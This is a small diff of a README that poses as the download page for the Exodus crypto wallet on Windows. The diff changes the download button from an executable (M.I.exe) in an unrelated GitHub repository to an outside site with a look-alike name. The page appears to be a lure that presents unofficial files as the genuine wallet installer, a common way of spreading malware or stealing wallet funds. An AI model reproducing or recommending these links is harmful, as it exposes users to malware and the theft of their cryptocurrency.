@@ -9,7 +9,7 @@ Moreover, the **Exodus Crypto Wallet App** offers additional features like portf
 
 1. Click the button below to start the **Exodus Crypto Wallet Download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/6e2eaabd-1c0d-44f7-9741-e671064d6e6e" alt="Download" width="300"/>
     </a>
 2. Find the downloaded installation file in your "Downloads" folder.
